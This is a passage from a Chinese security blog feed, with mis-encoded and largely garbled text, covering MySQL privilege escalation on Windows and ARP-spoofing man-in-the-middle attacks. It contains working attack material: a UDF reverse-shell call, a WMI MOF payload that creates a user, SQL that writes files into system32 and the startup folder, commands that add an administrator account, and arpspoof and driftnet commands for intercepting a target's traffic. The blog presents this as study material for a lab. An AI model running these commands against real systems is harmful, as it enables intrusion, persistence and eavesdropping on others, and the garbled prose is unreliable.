href="https://github.com/BeyondOneself/mysql-reverse-shell-priviledge">https://github.com/BeyondOneself/mysql-reverse-shell-priviledge</a></p><p>å£°æ˜ä¸€ä¸ª<code>backdoor</code>å‡½æ•°ï¼Œç¬¬äºŒæ¡å®šä¹‰çš„<code>@a</code>æ˜¯<code>udf.dll</code>å†…å®¹çš„<code>16</code>è¿›åˆ¶</p><p>æ‰§è¡Œå³å¯æˆåŠŸåå¼¹shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> backshell(<span class="string">&quot;192.168.0.12&quot;</span>,<span class="number">4444</span>);</span><br></pre></td></tr></table></figure><h2 id="mofææƒ"><a href="#mofææƒ" class="headerlink" title="mofææƒ"></a>mofææƒ</h2><h3 id="mofææƒç®€ä»‹"><a href="#mofææƒç®€ä»‹" class="headerlink" title="mofææƒç®€ä»‹"></a>mofææƒç®€ä»‹</h3><p>MOFæ–‡ä»¶æ˜¯mysqlæ•°æ®åº“çš„æ‰©å±•æ–‡ä»¶ï¼ˆåœ¨<code>c:/windows/system32/wbem/mof/nullevt.mof</code>ï¼‰å«åšâ€æ‰˜ç®¡å¯¹è±¡æ ¼å¼â€ï¼Œå…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚</p><p>MOFæ–‡ä»¶æ—¢ç„¶æ¯äº”ç§’å°±ä¼šæ‰§è¡Œï¼Œè€Œä¸”æ˜¯ç³»ç»Ÿæƒé™ï¼Œæˆ‘ä»¬é€šè¿‡mysqlå°†æ–‡ä»¶å†™å…¥ä¸€ä¸ªMOFæ–‡ä»¶æ›¿æ¢æ‰åŸæœ‰çš„MOFæ–‡ä»¶ï¼Œç„¶åç³»ç»Ÿæ¯éš”äº”ç§’å°±ä¼šæ‰§è¡Œä¸€æ¬¡æˆ‘ä»¬ä¸Šä¼ çš„MOFã€‚MOFå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶è¿™æ®µvbsè„šæœ¬çš„å†…å®¹è®©ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤ï¼Œè¿›è¡Œææƒã€‚</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Windows&lt;=2003</li><li>mysqlåœ¨c:windows/system32/mofç›®å½•æœ‰å†™æƒé™</li><li>å·²çŸ¥æ•°æ®åº“è´¦å·å¯†ç </li></ul><p><strong>exp:</strong></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">Name = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user test <span class="number">123456</span> /add\<span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line"><span class="built_in">Filter</span> = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç¡®ä¿äº†å‰é¢çš„æ¡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ æˆ‘ä»¬çš„mofæ–‡ä»¶åˆ°æœåŠ¡å™¨ä»»æ„ç›®å½•ï¼Œä¸€èˆ¬æ˜¯ç½‘ç«™å…è®¸ä¸Šä¼ çš„ç›®å½•ã€‚</p><p>ç„¶åé€šè¿‡mysqlè¯­å¥å°†è¿™ä¸ªæ–‡ä»¶å¯¼å…¥åˆ°nullevt.mof</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&quot;F:/wamp/www/upload/test.mof&quot;</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†dumpfileè€Œä¸æ˜¯outfileæ˜¯å› ä¸ºï¼š</p><ul><li>dumpfileåªèƒ½å¯¼å‡ºä¸€è¡Œæ•°æ®</li><li>outfileå¯ä»¥å®Œæ•´çš„å¯¼å‡ºæ¯è¡Œè®°å½•ï¼Œå¹¶ä¸”ä¼šåœ¨è¡Œæœ«ç«¯å†™å…¥æ–°è¡Œï¼Œå¹¶ä¸”ä¼šè½¬ä¹‰æ¢è¡Œç¬¦ã€‚</li></ul><p>å¦‚æœç”¨outfileè¿™ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶å°±ä¼šè¢«ç ´åï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†dumpfileã€‚</p><p>ç„¶åæˆ‘ä»¬åˆ†åˆ«ä¸¤æ¬¡å°†åˆ›å»ºç”¨æˆ·å’Œææƒå‘½ä»¤æ›¿æ¢pocä¸­çš„å‘½ä»¤åšä¸Šè¿°æ“ä½œå³å¯ã€‚ä¸¤æ¬¡ä½¿ç”¨çš„å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.exe user test 123456 /add</span><br><span class="line">net.exe user localgroup administrators test /add</span><br></pre></td></tr></table></figure><p>åˆ é™¤è´¦å·éœ€è¦é‡å¯æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:/windows/system32/wbem/repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§è¿™ç§æ€è·¯æˆ‘ä»¬ä¹Ÿå¯ä»¥å†™vbsåˆ°å¼€æœºå¯åŠ¨é¡¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a (cmd <span class="built_in">text</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot;</span> ); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot;</span> ); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot;</span> ); </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> a <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;C:\\Documents and Settings\\All Users\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨\\a.vbs&quot;</span>;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/7392">https://xz.aliyun.com/t/7392</a></p><p><a href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83">https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83</a></p><p><a href="https://xz.aliyun.com/t/2719">https://xz.aliyun.com/t/2719</a></p><p><a href="https://www.freebuf.com/articles/system/163144.html">https://www.freebuf.com/articles/system/163144.html</a></p><p><a href="https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­é—´äººæ”»å‡»å­¦ä¹ </title>
      <link href="2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»ä¸­é—´äººæ”»å‡»çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><p><strong>æœ¬æ–‡ä»…ä½œæŠ€æœ¯äº¤æµï¼Œè¯·å‹¿åšè¿æ³•ä¹±çºªçš„äº‹ï¼</strong></p><h2 id="ä¸­é—´äººæ”»å‡»"><a href="#ä¸­é—´äººæ”»å‡»" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h2><p>ä¸­é—´äººæ”»å‡»ï¼ˆMan-in-the-MiddleAttackï¼Œç®€ç§°â€œMITMæ”»å‡»â€ï¼‰æ˜¯ä¸€ç§â€œé—´æ¥â€çš„å…¥ä¾µæ”»å‡»ï¼Œè¿™ç§æ”»å‡»æ¨¡å¼æ˜¯é€šè¿‡å„ç§æŠ€æœ¯æ‰‹æ®µå°†å—å…¥ä¾µè€…æ§åˆ¶çš„ä¸€å°è®¡ç®—æœºè™šæ‹Ÿæ”¾ç½®åœ¨ç½‘ç»œè¿æ¥ä¸­çš„ä¸¤å°é€šä¿¡è®¡ç®—æœºä¹‹é—´ï¼Œè¿™å°è®¡ç®—æœºå°±ç§°ä¸ºâ€œä¸­é—´äººâ€ã€‚è¿™æ ·çš„è¯ï¼Œä¸¤å°é€šä¿¡è®¡ç®—æœºä¹‹é—´çš„æµé‡éƒ½ä¼šç»è¿‡è¢«æ§è®¡ç®—æœºï¼Œé€šè¿‡ä¿¡æ¯ç¯¡æ”¹ï¼Œä¿¡æ¯çªƒå–ç­‰æ–¹å¼å¯¹æ­£å¸¸çš„é€šä¿¡é€ æˆå¨èƒã€‚</p><p>éšç€è®¡ç®—æœºé€šä¿¡ç½‘æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼ŒMITMæ”»å‡»ä¹Ÿè¶Šæ¥è¶Šå¤šæ ·åŒ–ã€‚æœ€åˆï¼Œæ”»å‡»è€…åªè¦å°†ç½‘å¡è®¾ä¸ºæ··æ‚æ¨¡å¼ï¼Œä¼ªè£…æˆä»£ç†æœåŠ¡å™¨ç›‘å¬ç‰¹å®šçš„æµé‡å°±å¯ä»¥å®ç°æ”»å‡»ï¼Œè¿™æ˜¯å› ä¸ºå¾ˆå¤šé€šä¿¡åè®®éƒ½æ˜¯ä»¥æ˜æ–‡æ¥è¿›è¡Œä¼ è¾“çš„ï¼Œå¦‚HTTPã€FTPã€Telnetç­‰ã€‚åæ¥ï¼Œéšç€äº¤æ¢æœºä»£æ›¿é›†çº¿å™¨ï¼Œç®€å•çš„å—…æ¢æ”»å‡»å·²ç»ä¸èƒ½æˆåŠŸï¼Œå¿…é¡»å…ˆè¿›è¡ŒARPæ¬ºéª—æ‰è¡Œã€‚å¦‚ä»Šï¼Œè¶Šæ¥è¶Šå¤šçš„æœåŠ¡å•†ï¼ˆç½‘ä¸Šé“¶è¡Œï¼Œé‚®ç®±ç™»é™†ï¼‰å¼€å§‹é‡‡ç”¨åŠ å¯†é€šä¿¡ï¼ŒSSL(Secure Sockets Layer å®‰å…¨å¥—æ¥å±‚)æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„æŠ€æœ¯ï¼ŒHTTPSã€FTPSç­‰éƒ½æ˜¯å»ºç«‹åœ¨å…¶åŸºç¡€ä¸Šçš„ã€‚</p><h2 id="arpåœ°å€æ¬ºéª—"><a href="#arpåœ°å€æ¬ºéª—" class="headerlink" title="arpåœ°å€æ¬ºéª—"></a>arpåœ°å€æ¬ºéª—</h2><p>åœ¨åŒä¸€å±€åŸŸç½‘å†…çš„ä¸»æœºé€šä¿¡ä¾é arpåœ°å€è€Œä¸æ˜¯ipåœ°å€ï¼Œå½“ä¸¤å°ä¸»æœºé€šä¿¡æ—¶(A å’Œ B)ï¼Œä¸»æœºA å‘ä¸»æœºBå‘é€ä¸€ä¸ªarpå¹¿æ’­ï¼ˆå†…æœ‰ä¸»æœºBçš„IPåœ°å€ï¼‰ï¼Œå±€åŸŸç½‘å†…çš„æ‰€æœ‰ä¸»æœºéƒ½ä¼šæ”¶åˆ°è¿™ä¸ªarpåŒ…ï¼Œç„¶åä¸åœ¨è‡ªå·±çš„ipåœ°å€è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç¬¦åˆå°±å›å¤ç»™ä¸»æœº A ä¸€ä¸ªå¸¦æœ‰è‡ªå·±çš„arpåœ°å€çš„arpåŒ…ï¼ŒåŒæ—¶å°†ä¸»æœº A çš„arpåœ°å€è®°å½•ä¸‹æ¥ã€‚æ¥ç€ä½¿ç”¨è¿™ä¸ªMACåœ°å€å‘é€æ•°æ®ï¼ˆç”±ç½‘å¡é™„åŠ MACåœ°å€ï¼‰ã€‚å› æ­¤ï¼Œæœ¬åœ°é«˜é€Ÿç¼“å­˜çš„è¿™ä¸ªARPè¡¨æ˜¯æœ¬åœ°ç½‘ç»œæµé€šçš„åŸºç¡€ï¼Œè€Œä¸”è¿™ä¸ªç¼“å­˜æ˜¯åŠ¨æ€çš„ï¼Œä¸»æœºçš„æ¯æ¬¡é€šä¿¡éƒ½éœ€è¦ä»æ–°å‘é€arpå¹¿æ’­åŒ…å¾—åˆ°ä¸»æœº B çš„arpåœ°å€ï¼ˆåŠ¨æ€æ€§ï¼‰ã€‚</p><p>å¦‚æœè¿™æ—¶æœ‰ä¸€å°ä¸»æœºCæƒ³è¦è·å–ä¸¤å°ä¸»æœºçš„é€šä¿¡è¿‡ç¨‹æ—¶ï¼Œä¸»æœºC å¯ä»¥ä¸»åŠ¨å‘ä¸»æœºA å‘é€ arpåº”ç­”åŒ… ä¸»æœºAæ¥æ”¶åˆ°è¿™ä¸ªåº”ç­”åŒ…åæ›´æ–°è‡ªå·±çš„arpç¼“å­˜è¡¨ å½“ç„¶è¿˜æ˜¯Bçš„ipä½†macåœ°å€å·²ç»æ”¹å˜ ï¼Œè¿™æ—¶ä¸»æœºCå†æ­£å¸¸è¿æ¥ä¸»æœºBï¼Œè¿™æ ·å°±å¯ä»¥ç›‘å¬åŒæ–¹çš„é€šä¿¡è¿‡ç¨‹å¹¶ä¸”ä¸è¢«å‘ç° ï¼Œè¿™æ˜¯ä¸€ç§æœ€å…¸å‹çš„arpæ¬ºéª—ã€‚</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325231032.png" style="zoom:50%;"><h2 id="å¸¸ç”¨å·¥å…·"><a href="#å¸¸ç”¨å·¥å…·" class="headerlink" title="å¸¸ç”¨å·¥å…·"></a>å¸¸ç”¨å·¥å…·</h2><h3 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h3><p>arp-scanæ˜¯Kali Linuxè‡ªå¸¦çš„ä¸€æ¬¾ARPæ‰«æå·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥è¿›è¡Œå•ä¸€ç›®æ ‡æ‰«æï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæ‰¹é‡æ‰«æã€‚æ‰¹é‡æ‰«æçš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡CIDRã€åœ°å€èŒƒå›´æˆ–è€…åˆ—è¡¨æ–‡ä»¶çš„æ–¹å¼æŒ‡å®šã€‚è¯¥å·¥å…·å…è®¸ç”¨æˆ·å®šåˆ¶ARPåŒ…ï¼Œæ„å»ºéæ ‡å‡†æ•°æ®åŒ…ã€‚åŒæ—¶ï¼Œè¯¥å·¥å…·ä¼šè‡ªåŠ¨è§£æMacåœ°å€ï¼Œç»™å‡ºMACå¯¹åº”çš„ç¡¬ä»¶å‚å•†ï¼Œå¸®åŠ©ç”¨æˆ·ç¡®è®¤ç›®æ ‡ã€‚</p><p><strong>æŸ¥çœ‹åŒä¸€å±€åŸŸç½‘å­˜æ´»çš„ä¸»æœºï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan --interface=wlan0 --localnet</span><br></pre></td></tr></table></figure><h3 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h3><p>arpspoofæ˜¯ä¸€ä¸ªå¥½ç”¨çš„ARPæ¬ºéª—å·¥å…·ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br></pre></td></tr></table></figure><ul><li>-i æŒ‡å®šç½‘å¡</li><li>-c æŒ‡å®šè¿˜åŸarpé…ç½®æ—¶ä½¿ç”¨çš„ç¡¬ä»¶åœ°å€</li><li>-t æŒ‡å®šarpæ¬ºéª—çš„ç›®æ ‡</li><li>hostä¸€èˆ¬ä¸ºç½‘å…³</li><li>-r æ¬ºéª—ä¸¤ä¸ªä¸»æœºï¼ˆç½‘å…³å’Œç›®æ ‡ï¼‰ä»¥æ•è·åŒå‘é€šä¿¡</li></ul><p><strong>æ¬ºéª—ç½‘å…³å’Œç›®æ ‡ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.1.105 -r 192.168.1.1</span><br></pre></td></tr></table></figure><h3 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h3><p>driftnetæ˜¯ä¸€æ¬¾ç®€å•è€Œä½¿ç”¨çš„å›¾ç‰‡æ•è·å·¥å…·ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨ç½‘ç»œæ•°æ®åŒ…ä¸­æŠ“å–å›¾ç‰‡ã€‚è¯¥å·¥å…·å¯ä»¥å®æ—¶å’Œç¦»çº¿æ•è·æŒ‡å®šæ•°æ®åŒ…ä¸­æ˜¯å›¾ç‰‡ï¼Œkalié‡Œé»˜è®¤æœ‰ã€‚</p><p><strong>ä¸»è¦å‚æ•°ï¼š</strong></p><ul><li><p>-b  æ•è·åˆ°æ–°çš„å›¾ç‰‡æ—¶å‘å‡ºå˜Ÿå˜Ÿå£°</p></li><li><p>-i interface   é€‰æ‹©ç›‘å¬æ¥å£</p></li><li><p>-f file  è¯»å–ä¸€ä¸ªæŒ‡å®špcapæ•°æ®åŒ…ä¸­çš„å›¾ç‰‡</p></li><li><p>-p ä¸è®©æ‰€ç›‘å¬çš„æ¥å£ä½¿ç”¨æ··æ‚æ¨¡å¼</p></li><li><p>-a åå°æ¨¡å¼ï¼šå°†æ•è·çš„å›¾ç‰‡ä¿å­˜åˆ°ç›®å½•ä¸­ï¼ˆä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼‰</p></li><li><p>-m number æŒ‡å®šä¿å­˜å›¾ç‰‡æ•°çš„æ•°ç›®</p></li><li><p>-d directory æŒ‡å®šä¿å­˜å›¾ç‰‡çš„è·¯å¾„</p></li><li><p>-x prefix æŒ‡å®šä¿å­˜å›¾ç‰‡çš„å‰ç¼€å</p></li></ul><p><strong>åå°ç›‘å¬ç½‘å¡ä¿å­˜å›¾ç‰‡å¹¶æç¤ºï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0 -b -a -d /root/Desktop/pic</span><br></pre></td></tr></table></figure><h3 id="xerosploit"><a href="#xerosploit" class="headerlink" title="xerosploit"></a>xerosploit</h3><p>githubåœ°å€ï¼š<a href="https://github.com/LionSec/xerosploit">https://github.com/LionSec/xerosploit</a></p><p>Xerosploitæ˜¯ä¸€æ¬¾å¯ä»¥è¿›è¡Œä¸­é—´äººæ”»å‡»çš„æ¸—é€æµ‹è¯•å·¥å…·åŒ…ã€‚å®ƒå…·æœ‰å¤šç§æ¨¡å—ï¼Œå¯ä»¥è¿›è¡Œå¤šé‡æœ‰æ•ˆçš„æ”»å‡»ï¼Œå¦‚æ‹’ç»æœåŠ¡å’Œç«¯å£æ‰«æã€åŠ«æŒç­‰ã€‚ç”±bettercapå’Œnmapå¼ºåŠ›é©±åŠ¨ã€‚</p><p>å¯æƒœçš„æ˜¯ï¼Œè¿™æ¬¾å·¥å…·å·²ç»å¾ˆé•¿æ—¶é—´ä¸ç»´æŠ¤äº†ï¼Œä½†åŠŸèƒ½ä¾æ—§å¾ˆå¼ºå¤§</p><p>å·¥å…·å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LionSec/xerosploit</span><br><span class="line"><span class="built_in">cd</span> xerosploit &amp;&amp; sudo python install.py</span><br><span class="line">sudo xerosploit</span><br></pre></td></tr></table></figure><p>å®‰è£…ä¸­å¯èƒ½ä¼šä¼šç¼ºå°‘ä¾èµ–åŒ…ï¼Œç›´æ¥pipå®‰è£…å°±è¡Œ</p><p>æœ‰è¿™ä¹ˆå¤šæ¨¡å—ï¼Œç›´æ¥ä½¿ç”¨å°±è¡Œï¼Œéå¸¸æ–¹ä¾¿ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pscanï¼šç«¯å£æ‰«æ</span><br><span class="line">dosï¼šå¯¹ç›®æ ‡è¿›è¡Œdosæ”»å‡»</span><br><span class="line">pingï¼šå¯¹ç›®æ ‡è¿›è¡Œpingæ˜¯å¦å­˜æ´»</span><br><span class="line">injecthtmlï¼šå°†htmlæ³¨å…¥åˆ°ç›®æ ‡è®¿é—®çš„ç½‘ç«™ä¸­</span><br><span class="line">injectjsï¼šå°†javascriptæ³¨å…¥åˆ°ç›®æ ‡è®¿é—®çš„ç½‘ç«™ä¸­</span><br><span class="line">rdownloadï¼šæ›¿æ¢ç›®æ ‡ä¸‹è½½çš„æ–‡ä»¶</span><br><span class="line">sniffï¼šå—…æ¢ç›®æ ‡çš„æµé‡ä¿¡æ¯</span><br><span class="line">dspoofï¼šå°†æ‰€æœ‰httpæµé‡é‡å®šå‘åˆ°ç‰¹å®šip</span><br><span class="line">yplayï¼šåœ¨ç›®æ ‡çš„æµè§ˆå™¨ä¸­åå°æ’­æ”¾youtubeè§†é¢‘ï¼ˆè¿˜å¾—fqï¼‰</span><br><span class="line">replaceï¼šæ›¿æ¢ç›®æ ‡è®¿é—®ç½‘ç«™çš„æ‰€æœ‰å›¾ç‰‡</span><br><span class="line">driftnetï¼šæŸ¥çœ‹ç›®æ ‡è®¿é—®ç½‘ç«™çš„æ‰€æœ‰å›¾ç‰‡</span><br><span class="line">moveï¼šè®©ç›®æ ‡è®¿é—®ç½‘ç«™å˜å¾—æŠ–åŠ¨</span><br><span class="line">defaceï¼šå°†ç›®æ ‡è®¿é—®ç½‘ç«™çš„æ‰€æœ‰é¡µé¢æ›¿æ¢æˆè‡ªå·±å®šä¹‰çš„htmlä»£ç </span><br></pre></td></tr></table></figure><h2 id="æŠ“å–å±€åŸŸç½‘é‡Œçš„å›¾ç‰‡"><a href="#æŠ“å–å±€åŸŸç½‘é‡Œçš„å›¾ç‰‡" class="headerlink" title="æŠ“å–å±€åŸŸç½‘é‡Œçš„å›¾ç‰‡"></a>æŠ“å–å±€åŸŸç½‘é‡Œçš„å›¾ç‰‡</h2><p>kaliï¼š192.168.0.112</p><p>é¶æœºï¼š192.168.0.103</p><p>æ²¡è¿›è¡Œarpæ¬ºéª—ä¹‹å‰ï¼Œæˆ‘ä»¬çœ‹ä¸‹arpè¡¨</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325214515.png" style="zoom:80%;"><p>è®©åè®¾ç½®ipè½¬å‘,é»˜è®¤ä¸º0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸è®¾ç½®ä¸º1ï¼Œè¿›è¡Œä¸‹é¢çš„æ“ä½œç›¸å½“äºæ–­ç½‘æ”»å‡»</p><p>ç„¶åæˆ‘ä»¬è¿›è¡Œæ¬ºéª—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å†çœ‹ä¸‹arpè¡¨ï¼Œå‘ç°macåœ°å€å·²ç»å‘ç”Ÿæ”¹å˜æˆkaliçš„macåœ°å€</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325214839.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå·²ç»æŠ“åˆ°å›¾ç‰‡ï¼Œæ„Ÿè°¢å¤§ä½¬çš„åšå®¢åšå®éªŒï¼Œé€ƒâ€¦â€¦</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325215406.png" style="zoom:80%;"><p>å‘ç°å¹¶ä¸æ˜¯å¾ˆå…¨ï¼Œhttpsçš„éƒ½æ²¡æŠ“åˆ°</p><p>æˆ‘ä»¬ç”¨wiresharkæŸ¥çœ‹ä¸€ä¸‹æµé‡ï¼Œè®¾ç½®ä¸€ä¸‹æºåœ°å€ï¼Œå°±èƒ½çœ‹åˆ°æˆªè·çš„æµé‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src==192.168.0.103</span><br></pre></td></tr></table></figure><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325220555.png" style="zoom:80%;"><h2 id="xerosploitä¸€äº›æ“ä½œ"><a href="#xerosploitä¸€äº›æ“ä½œ" class="headerlink" title="xerosploitä¸€äº›æ“ä½œ"></a>xerosploitä¸€äº›æ“ä½œ</h2><p>å®‰è£…ç»“æŸåç›´æ¥è¿è¡Œxerosploit</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200325221354.png" 